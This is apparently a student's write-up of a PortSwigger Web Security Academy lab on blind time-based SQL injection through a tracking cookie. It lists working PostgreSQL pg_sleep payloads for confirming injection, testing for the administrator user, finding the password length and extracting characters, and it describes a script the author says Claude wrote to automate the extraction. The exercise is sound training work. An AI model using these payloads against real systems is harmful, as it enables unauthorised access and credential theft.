Same vuln, tracking cookie again. This time there's a `users` table with `username` and `password` columns and we need the admin password, but there's no error output and no visible difference in the response - purely blind on timing.

Confirmed injection again:
```
' || pg_sleep(10)--
```

Then built the conditional:
```
'|| select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end--
```
if the condition is true it sleeps 10s, otherwise -1 (basically instant).

Checked the username exists:
```
'|| (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end)--
```
took over 10 seconds - user exists.

Then needed the password length before trying to extract anything:
```
'|| (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
```
Ran this through Burp Intruder (sniper attack), swapped the 25 for numbers 1-25 as the payload. Length came back as 20.

From here doing it manually one character at a time in Burp Community is painful since there's no proper multithreaded Intruder in the free version, so I had AI (Claude) write a small python script to automate it - sends a request per guessed character through the cookie, times the response, and if it's over the threshold that character is correct. Added a second check on every hit before accepting it because the first run gave a wrong password (turned out to be a timing false positive from network jitter mid-run).

The condition it sends looks like:
```
username='administrator' and substring(password,{position},1)='{char}'
```

Final password: `vcb0hvp0dpc4tuuwuklq`

Logged in as admin, lab solved.

---

`crack_password.py` was written by Claude (AI), not by me - I described what I needed (automate the character-by-character extraction) and had it generate the script, then used it against the lab.

Running the script:
```
python3 crack_password.py
```

Need to edit these at the top before running:
```
TARGET = "https://YOUR-LAB-ID.web-security-academy.net/"
TRACKING_ID_PREFIX = "..."
SESSION_ID = "..."
PASSWORD_LENGTH = 20
SLEEP_TIME = 10
THRESHOLD = 7
```

Couple things to watch out for:
- session cookie expires, if the script starts returning nonsense partway through just grab a new session value and rerun
- charset only covers letters + digits right now, would need extending if a password used symbols
